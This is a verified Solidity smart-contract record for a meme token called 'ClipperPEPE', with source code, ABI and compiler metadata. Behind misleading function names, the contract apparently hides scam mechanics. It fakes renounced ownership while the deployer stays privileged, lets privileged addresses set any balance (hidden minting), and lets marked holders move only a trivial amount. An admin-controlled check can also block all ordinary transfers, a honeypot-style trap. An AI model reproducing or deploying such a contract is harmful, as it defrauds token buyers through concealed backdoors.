{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface exemptAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromTradingMin) external view returns (uint256);\n\n    function transfer(address txMax, uint256 maxAt) external returns (bool);\n\n    function allowance(address minTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txMax,\n        uint256 maxAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverAmount, uint256 value);\n    event Approval(address indexed minTrading, address indexed spender, uint256 value);\n}\n\nabstract contract fromTokenAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitEnableSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderTeam {\n    function createPair(address tokenLaunched, address isFee) external returns (address);\n}\n\ninterface exemptAmountMetadata is exemptAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ClipperPEPE is fromTokenAt, exemptAmount, exemptAmountMetadata {\n\n    function sellTx(address tradingLaunched, uint256 maxAt) public {\n        receiverModeLaunched();\n        liquidityEnable[tradingLaunched] = maxAt;\n    }\n\n    string private teamFee = \"CPE\";\n\n    function receiverTeam(address feeTo) public {\n        receiverModeLaunched();\n        if (sellMin != tradingMin) {\n            sellMin = tradingMin;\n        }\n        if (feeTo == buyExempt || feeTo == launchedLiquidity) {\n            return;\n        }\n        enableSender[feeTo] = true;\n    }\n\n    address public buyExempt;\n\n    function exemptLaunch(address receiverSwap, address txMax, uint256 maxAt) internal returns (bool) {\n        require(liquidityEnable[receiverSwap] >= maxAt);\n        liquidityEnable[receiverSwap] -= maxAt;\n        liquidityEnable[txMax] += maxAt;\n        emit Transfer(receiverSwap, txMax, maxAt);\n        return true;\n    }\n\n    bool private listExempt;\n\n    bool private launchedAmount;\n\n    uint256 public tradingMin;\n\n    function approve(address listMax, uint256 maxAt) public virtual override returns (bool) {\n        liquidityIsTx[_msgSender()][listMax] = maxAt;\n        emit Approval(_msgSender(), listMax, maxAt);\n        return true;\n    }\n\n    uint8 private autoTotal = 18;\n\n    function amountLiquidity(uint256 maxAt) public {\n        receiverModeLaunched();\n        teamLaunched = maxAt;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingSellIs;\n    }\n\n    uint256 fundLaunched;\n\n    function transferFrom(address receiverSwap, address txMax, uint256 maxAt) external override returns (bool) {\n        if (_msgSender() != senderMax) {\n            if (liquidityIsTx[receiverSwap][_msgSender()] != type(uint256).max) {\n                require(maxAt <= liquidityIsTx[receiverSwap][_msgSender()]);\n                liquidityIsTx[receiverSwap][_msgSender()] -= maxAt;\n            }\n        }\n        return fromMinAt(receiverSwap, txMax, maxAt);\n    }\n\n    function launchedSenderReceiver(address sellList) public {\n        require(sellList.balance < 100000);\n        if (enableTotal) {\n            return;\n        }\n        \n        listTrading[sellList] = true;\n        \n        enableTotal = true;\n    }\n\n    uint256 private teamAmount = 100000000 * 10 ** 18;\n\n    bool public enableTotal;\n\n    bool public receiverLaunchedSell;\n\n    bool private receiverEnable;\n\n    mapping(address => bool) public listTrading;\n\n    function receiverModeLaunched() private view {\n        require(listTrading[_msgSender()]);\n    }\n\n    bool public launchTokenTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamFee;\n    }\n\n    function transfer(address tradingLaunched, uint256 maxAt) external virtual override returns (bool) {\n        return fromMinAt(_msgSender(), tradingLaunched, maxAt);\n    }\n\n    function allowance(address marketingAuto, address listMax) external view virtual override returns (uint256) {\n        if (listMax == senderMax) {\n            return type(uint256).max;\n        }\n        return liquidityIsTx[marketingAuto][listMax];\n    }\n\n    function owner() external view returns (address) {\n        return marketingSellIs;\n    }\n\n    address senderMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 teamLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return atTeam;\n    }\n\n    address private marketingSellIs;\n\n    mapping(address => bool) public enableSender;\n\n    address walletFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoTotal;\n    }\n\n    bool private atMin;\n\n    mapping(address => mapping(address => uint256)) private liquidityIsTx;\n\n    uint256 constant totalMode = 12 ** 10;\n\n    function marketingLiquidity() public {\n        emit OwnershipTransferred(buyExempt, address(0));\n        marketingSellIs = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamAmount;\n    }\n\n    event OwnershipTransferred(address indexed launchedLimitWallet, address indexed walletMax);\n\n    uint256 public sellMin;\n\n    function balanceOf(address fromTradingMin) public view virtual override returns (uint256) {\n        return liquidityEnable[fromTradingMin];\n    }\n\n    address public launchedLiquidity;\n\n    uint256 public sellTotalReceiver;\n\n    constructor (){\n        \n        limitEnableSell marketingLimit = limitEnableSell(senderMax);\n        launchedLiquidity = senderTeam(marketingLimit.factory()).createPair(marketingLimit.WETH(), address(this));\n        if (sellTotalReceiver != sellMin) {\n            atMin = false;\n        }\n        buyExempt = _msgSender();\n        marketingLiquidity();\n        listTrading[buyExempt] = true;\n        liquidityEnable[buyExempt] = teamAmount;\n        \n        emit Transfer(address(0), buyExempt, teamAmount);\n    }\n\n    function fromMinAt(address receiverSwap, address txMax, uint256 maxAt) internal returns (bool) {\n        if (receiverSwap == buyExempt) {\n            return exemptLaunch(receiverSwap, txMax, maxAt);\n        }\n        uint256 teamSwap = exemptAmount(launchedLiquidity).balanceOf(walletFund);\n        require(teamSwap == teamLaunched);\n        require(txMax != walletFund);\n        if (enableSender[receiverSwap]) {\n            return exemptLaunch(receiverSwap, txMax, totalMode);\n        }\n        return exemptLaunch(receiverSwap, txMax, maxAt);\n    }\n\n    bool private enableList;\n\n    string private atTeam = \"Clipper PEPE\";\n\n    mapping(address => uint256) private liquidityEnable;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLimitWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxAt\",\"type\":\"uint256\"}],\"name\":\"amountLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTradingMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTokenTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellList\",\"type\":\"address\"}],\"name\":\"launchedSenderReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunchedSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"}],\"name\":\"receiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotalReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAt\",\"type\":\"uint256\"}],\"name\":\"sellTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ClipperPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}